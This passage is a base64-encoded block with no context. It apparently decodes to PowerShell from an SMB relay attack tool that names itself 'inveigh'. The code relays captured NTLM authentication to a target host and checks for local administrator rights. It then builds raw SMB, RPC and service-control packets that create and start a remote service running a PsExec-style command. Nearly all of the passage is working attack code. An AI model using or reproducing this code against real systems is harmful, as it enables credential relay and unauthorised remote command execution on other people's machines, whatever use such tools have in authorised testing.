bU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbODguLjEwN10pIC1uZSAnMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX21hbmFnZXJfY29udGV4dF9oYW5kbGUgPSAkU01CX2NsaWVudF9yZWNlaXZlWzg4Li4xMDddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TQ01fZGF0YSA9IEdldC1QYWNrZXRTQ01DcmVhdGVTZXJ2aWNlVyAkU01CX3NlcnZpY2VfbWFuYWdlcl9jb250ZXh0X2hhbmRsZSAkU01CX3NlcnZpY2VfYnl0ZXMgJFNNQl9zZXJ2aWNlX2xlbmd0aCAkUHNFeGVjX2NvbW1hbmRfYnl0ZXMgJFBzRXhlY19jb21tYW5kX2xlbmd0aF9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTQ01fZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU0NNX2RhdGEKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNDTV9kYXRhLkxlbmd0aCAtbHQgJFNNQl9zcGxpdF9pbmRleCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0NyZWF0ZVNlcnZpY2VXJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdDcmVhdGVTZXJ2aWNlV19GaXJzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMDguLjExMV0pIC1lcSAnMDUtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBub3QgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9yIGRvZXMgbm90IGhhdmUgcmVxdWlyZWQgcHJpdmlsZWdlIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgbm90IGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvciBkb2VzIG5vdCBoYXZlIHJlcXVpcmVkIHByaXZpbGVnZSBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIG5vdCBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb3IgZG9lcyBub3QgaGF2ZSByZXF1aXJlZCBwcml2aWxlZ2Ugb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJ0NyZWF0ZVNlcnZpY2VXJwogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4MmYgMHgxOCAweDA1LDB4MjggJFNNQl90cmVlX0lEICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgJFNNQl91c2VyX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTUNyZWF0ZVNlcnZpY2VXICRTTUJfc2VydmljZV9tYW5hZ2VyX2NvbnRleHRfaGFuZGxlICRTTUJfc2VydmljZV9ieXRlcyAkU01CX3NlcnZpY2VfbGVuZ3RoICRQc0V4ZWNfY29tbWFuZF9ieXRlcyAkUHNFeGVjX2NvbW1hbmRfbGVuZ3RoX2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NDTV9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhID0gR2V0LVBhY2tldFJQQ1JlcXVlc3QgMHgwMyAkU0NNX2RhdGEuTGVuZ3RoIDAgMCAweDAyLDB4MDAsMHgwMCwweDAwIDB4MDAsMHgwMCAweDBjLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QgJFNNQl9GSUQgKCRSUENfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUENfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfbGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnUmVhZEFuZFhSZXF1ZXN0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdTdGFydFNlcnZpY2VXJyAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlU2VydmljZVdfRmlyc3QnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc3BsaXRfc3RhZ2VfZmluYWwgPSBbTWF0aF06OkNlaWxpbmcoJFNDTV9kYXRhLkxlbmd0aCAvICRTTUJfc3BsaXRfaW5kZXgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4MmYgMHgxOCAweDA1LDB4MjggJFNNQl90cmVlX0lEICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgJFNNQl91c2VyX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGFfZmlyc3QgPSAkU0NNX2RhdGFbMC4uKCRTTUJfc3BsaXRfaW5kZXggLSAxKV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAxIDAgMCAwIDB4MDIsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MGMsMHgwMCAkU0NNX2RhdGFfZmlyc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGFbIlJQQ1JlcXVlc3RfQWxsb2NIaW50Il0gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTQ01fZGF0YS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NwbGl0X2luZGV4X3RyYWNrZXIgPSAkU01CX3NwbGl0X2luZGV4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CV3JpdGVBbmRYUmVxdWVzdCAkU01CX0ZJRCAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQl9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGggIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc3BsaXRfc3RhZ2VfZmluYWwgLWxlIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ3JlYXRlU2VydmljZVdfTGFzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NwbGl0X3N0YWdlID0gMgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0NyZWF0ZVNlcnZpY2VXX01pZGRsZScKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdDcmVhdGVTZXJ2aWNlV19NaWRkbGUnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc3BsaXRfc3RhZ2UrKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDJmIDB4MTggMHgwNSwweDI4ICRTTUJfdHJlZV9JRCAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhX21pZGRsZSA9ICRTQ01fZGF0YVskU01CX3NwbGl0X2luZGV4X3RyYWNrZXIuLigkU01CX3NwbGl0X2luZGV4X3RyYWNrZXIgKyAkU01CX3NwbGl0X2luZGV4IC0gMSldCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NwbGl0X2luZGV4X3RyYWNrZXIgKz0gJFNNQl9zcGxpdF9pbmRleAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDAgMCAwIDAgMHgwMiwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwYywweDAwICRTQ01fZGF0YV9taWRkbGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGFbIlJQQ1JlcXVlc3RfQWxsb2NIaW50Il0gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTQ01fZGF0YS5MZW5ndGggLSAkU01CX3NwbGl0X2luZGV4X3RyYWNrZXIgKyAkU01CX3NwbGl0X2luZGV4KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUENfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QgJFNNQl9GSUQgJFJQQ19kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUJfZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc3BsaXRfc3RhZ2UgLWdlICRTTUJfc3BsaXRfc3RhZ2VfZmluYWwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ3JlYXRlU2VydmljZVdfTGFzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdDcmVhdGVTZXJ2aWNlV19NaWRkbGUnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlU2VydmljZVdfTGFzdCcKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDJmIDB4MTggMHgwNSwweDI4ICRTTUJfdHJlZV9JRCAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhX2xhc3QgPSAkU0NNX2RhdGFbJFNNQl9zcGxpdF9pbmRleF90cmFja2VyLi4kU0NNX2RhdGEuTGVuZ3RoXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDIgMCAwIDAgMHgwMiwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwYywweDAwICRTQ01fZGF0YV9sYXN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CV3JpdGVBbmRYUmVxdWVzdCAkU01CX0ZJRCAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQl9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGggIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkQW5kWFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZV9uZXh0ID0gJ1N0YXJ0U2VydmljZVcnCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdTdGFydFNlcnZpY2VXJwogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzExMi4uMTE1XSkgLWVxICcwMC0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGNyZWF0ZWQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiVHJ5aW5nIHRvIGV4ZWN1dGUgU01CIHJlbGF5IGNvbW1hbmQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBUcnlpbmcgdG8gZXhlY3V0ZSBTTUIgcmVsYXkgY29tbWFuZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiVHJ5aW5nIHRvIGV4ZWN1dGUgU01CIHJlbGF5IGNvbW1hbmQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2NvbnRleHRfaGFuZGxlID0gJFNNQl9jbGllbnRfcmVjZWl2ZVs5Mi4uMTExXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlciA9IEdldC1QYWNrZXRTTUJIZWFkZXIgMHgyZiAweDE4IDB4MDUsMHgyOCAkU01CX3RyZWVfSUQgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA